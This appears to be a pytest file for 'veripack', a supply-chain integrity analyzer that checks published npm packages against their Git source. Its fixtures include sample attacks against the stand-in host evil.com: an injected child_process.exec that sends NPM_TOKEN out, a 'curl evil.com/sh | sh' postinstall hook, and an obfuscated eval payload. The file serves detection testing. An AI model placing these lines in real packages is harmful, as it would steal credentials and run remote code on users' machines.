"""
Unit tests for veripack/analyzer.py & veripack/llm.py:
Validating the 3 mandatory Hacktoberfest Problem 4 evaluation archetypes:
1. Case 1: Expected Build Artifact (SAFE) vs Bundler Injections (COMPROMISED)
2. Case 2: Manifest Lifecycle Hook Tampering (TAMPERED)
3. Case 3: Ghost & Obfuscated Payloads (COMPROMISED)
"""

from pathlib import Path
import json

from veripack.analyzer import analyze_integrity
from veripack.models import Verdict, FileStatus, Archetype
from veripack.llm import generate_deterministic_explanation, query_qwen_explainer


def test_case_1_expected_build_artifact_safe(tmp_path: Path):
    """
    Case 1: Legitimate compilation from src/index.ts -> dist/index.js.
    Must be recognized as EXPECTED_BUILD_ARTIFACT and result in Verdict.SAFE.
    """
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir()
    src_dir.mkdir()

    # Source has src/index.ts
    (src_dir / "src").mkdir()
    (src_dir / "src" / "index.ts").write_text("export function add(a: number, b: number): number { return a + b; }")
    (src_dir / "package.json").write_text('{"name": "math-lib", "version": "1.0.0"}')

    # Published package has dist/index.js and package.json
    (pkg_dir / "dist").mkdir()
    (pkg_dir / "dist" / "index.js").write_text('"use strict"; exports.add = function(a, b) { return a + b; };')
    (pkg_dir / "package.json").write_text('{"name": "math-lib", "version": "1.0.0"}')

    report = analyze_integrity(pkg_dir, src_dir, package_name="math-lib", version="1.0.0", enable_llm=False)

    assert report.verdict == Verdict.SAFE
    assert report.summary_counts["expected_artifacts"] == 1
    assert report.summary_counts["critical"] == 0
    assert report.summary_counts["suspicious"] == 0

    # Verify finding
    build_finding = next(f for f in report.findings if f.file_path == "dist/index.js")
    assert build_finding.classification == FileStatus.EXPECTED_BUILD_ARTIFACT
    assert build_finding.archetype == Archetype.CASE_1_EXPECTED_BUILD


def test_case_1_bundler_capability_escalation_compromised(tmp_path: Path):
    """
    Case 1 Backdoor Variant (XZ / bundler injection):
    Compiled dist/index.js maps to src/index.ts, but introduces child_process.exec not in source.
    Must trigger CAPABILITY_ESCALATION and result in Verdict.COMPROMISED.
    """
    pkg_dir = tmp_path / "pkg_xz"
    src_dir = tmp_path / "src_xz"
    pkg_dir.mkdir()
    src_dir.mkdir()

    # Clean source
    (src_dir / "src").mkdir()
    (src_dir / "src" / "index.ts").write_text("export function greet(): string { return 'hello'; }")
    (src_dir / "package.json").write_text('{"name": "greeter", "version": "1.0.0"}')

    # Tampered package: dist/index.js silently injects child_process.exec
    (pkg_dir / "dist").mkdir()
    (pkg_dir / "dist" / "index.js").write_text(
        '"use strict";\n'
        'const cp = require("child_process");\n'
        'cp.exec("curl evil.com/exfil?token=" + process.env.NPM_TOKEN);\n'
        'exports.greet = function() { return "hello"; };'
    )
    (pkg_dir / "package.json").write_text('{"name": "greeter", "version": "1.0.0"}')

    report = analyze_integrity(pkg_dir, src_dir, package_name="greeter", version="1.0.0", enable_llm=False)

    assert report.verdict == Verdict.COMPROMISED
    assert report.summary_counts["critical"] >= 1
    finding = next(f for f in report.findings if f.file_path == "dist/index.js")
    assert finding.classification == FileStatus.CAPABILITY_ESCALATION


def test_case_2_manifest_lifecycle_injection_tampered(tmp_path: Path):
    """
    Case 2: Manifest Tampering.
    Upstream package.json is clean; published archive injects a postinstall hook.
    Must trigger SUSPICIOUS_MANIFEST and result in Verdict.TAMPERED.
    """
    pkg_dir = tmp_path / "pkg_manifest"
    src_dir = tmp_path / "src_manifest"
    pkg_dir.mkdir()
    src_dir.mkdir()

    # Clean source
    (src_dir / "package.json").write_text(json.dumps({
        "name": "target-pkg",
        "version": "1.0.0",
        "scripts": {"build": "tsc", "test": "jest"}
    }))

    # Tampered package with added postinstall hook
    (pkg_dir / "package.json").write_text(json.dumps({
        "name": "target-pkg",
        "version": "1.0.0",
        "scripts": {
            "build": "tsc",
            "test": "jest",
            "postinstall": "curl evil.com/sh | sh"
        }
    }))

    report = analyze_integrity(pkg_dir, src_dir, package_name="target-pkg", version="1.0.0", enable_llm=False)

    assert report.verdict == Verdict.TAMPERED
    assert report.summary_counts["suspicious"] == 1

    finding = next(f for f in report.findings if f.file_path == "package.json")
    assert finding.classification == FileStatus.SUSPICIOUS_MANIFEST
    assert finding.archetype == Archetype.CASE_2_MANIFEST_TAMPERING
    assert any("postinstall" in ev for ev in finding.evidence)


def test_case_3_ghost_obfuscated_file_compromised(tmp_path: Path):
    """
    Case 3: Ghost / Unmapped Obfuscated File.
    Published archive contains lib/x.min.js with high entropy and eval, found nowhere in Git source.
    Must trigger UNMAPPED_GHOST_FILE and result in Verdict.COMPROMISED.
    """
    pkg_dir = tmp_path / "pkg_ghost"
    src_dir = tmp_path / "src_ghost"
    pkg_dir.mkdir()
    src_dir.mkdir()

    # Source only has index.js
    (src_dir / "index.js").write_text("console.log('clean');")
    (src_dir / "package.json").write_text('{"name": "ghost-demo"}')

    # Package has index.js PLUS a phantom ghost file: lib/x.min.js
    (pkg_dir / "index.js").write_text("console.log('clean');")
    (pkg_dir / "package.json").write_text('{"name": "ghost-demo"}')
    (pkg_dir / "lib").mkdir()
    
    # Obfuscated high-entropy payload
    obfuscated_payload = (
        "var _0x9876 = ['\\x65\\x76\\x61\\x6c', '\\x72\\x65\\x71'];\n"
        "eval(atob('Y29uc29sZS5sb2coJ2V2aWwnKQ=='));\n"
        + "/* payload */" + "".join(chr((i * 17) % 94 + 32) for i in range(1200))
    )
    (pkg_dir / "lib" / "x.min.js").write_text(obfuscated_payload)

    report = analyze_integrity(pkg_dir, src_dir, package_name="ghost-demo", version="1.0.0", enable_llm=False)

    assert report.verdict == Verdict.COMPROMISED
    assert report.summary_counts["critical"] >= 1

    ghost_finding = next(f for f in report.findings if f.file_path == "lib/x.min.js")
    assert ghost_finding.classification == FileStatus.UNMAPPED_GHOST_FILE
    assert ghost_finding.archetype == Archetype.CASE_3_GHOST_OBFUSCATED
    assert ghost_finding.entropy > 5.0


def test_deterministic_llm_fallback(monkeypatch):
    """Verify deterministic explanation fallback generates clear security reasons when Ollama is offline."""
    monkeypatch.setenv("VERIPACK_OLLAMA_URL", "http://127.0.0.1:1/offline")
    explanation = generate_deterministic_explanation(
        file_path="package.json",
        classification="SUSPICIOUS_MANIFEST",
        evidence=["postinstall: curl evil.com | sh"],
    )
    assert "Suspicious manifest" in explanation
    assert "postinstall" in explanation

    # Ensure query_qwen_explainer falls back gracefully without crashing when offline
    offline_resp = query_qwen_explainer(
        file_path="lib/x.min.js",
        classification="UNMAPPED_GHOST_FILE",
        evidence=["No source counterpart", "Entropy 6.84"],
        diff_snippet="eval(base64)",
        entropy=6.84,
    )
    assert len(offline_resp) > 20
    assert "ghost file" in offline_resp.lower()
